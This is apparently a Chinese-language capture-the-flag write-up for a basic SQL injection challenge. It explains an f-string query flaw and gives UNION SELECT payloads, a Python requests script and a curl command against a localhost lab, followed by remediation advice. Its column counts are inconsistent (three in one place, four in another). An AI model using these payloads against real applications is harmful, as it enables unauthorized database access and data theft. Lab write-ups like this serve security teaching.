# WriteUP - Easy SQL注入

## 漏洞原理

SQL注入（SQL Injection）是一种常见的Web安全漏洞，攻击者通过在用户输入中插入恶意SQL语句，干扰应用程序正常的SQL查询逻辑，从而执行非授权的数据库操作。

本题中后端代码直接使用Python f-string拼接SQL语句：

```python
sql = f"SELECT * FROM users WHERE id = '{user_id}'"
```

当用户输入 `1` 时，SQL为：
```sql
SELECT * FROM users WHERE id = '1'
```

但如果用户输入 `' UNION SELECT flag, NULL, NULL FROM secret--`，SQL变为：
```sql
SELECT * FROM users WHERE id = '' UNION SELECT flag, NULL, NULL FROM secret--'
```

其中 `--` 是SQL注释，后面的单引号被注释掉。`UNION SELECT` 将 `secret` 表中的 `flag` 字段查询出来。

## 注入Payload详解

### 1. 确认注入点

访问：
```
/search?id=1'
```

如果出现SQL语法错误，说明存在注入点。

### 2. 确认列数

使用 `ORDER BY` 或 `UNION SELECT NULL` 确认返回列数：
```
/search?id=1' UNION SELECT NULL, NULL, NULL, NULL--
```

如果正常返回，说明列数匹配（4列）。

### 3. 查询flag

```
/search?id=' UNION SELECT flag, NULL, NULL, NULL FROM secret--
```

或在本题中（users表为4列：id, username, email, role）：
```
/search?id=' UNION SELECT flag, NULL, NULL, NULL FROM secret--
```

页面将显示flag内容。

## Python利用脚本

```python
import requests

url = "http://localhost:8081/search"
payload = "' UNION SELECT flag, NULL, NULL, NULL FROM secret--"

r = requests.get(url, params={"id": payload})
print(r.text)
```

## curl利用脚本

```bash
curl "http://localhost:8081/search?id=%27%20UNION%20SELECT%20flag%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20secret--"
```

## 修复建议

1. **使用参数化查询（Prepared Statements）**：
   ```python
   c.execute("SELECT * FROM users WHERE id = ?", (user_id,))
   ```

2. **使用ORM框架**：如SQLAlchemy，自动处理参数转义。

3. **输入验证与过滤**：对用户输入进行白名单校验，仅允许预期格式的输入。

4. **最小权限原则**：数据库连接账号仅授予必要的查询权限，禁止 `UNION`、`DROP` 等危险操作。
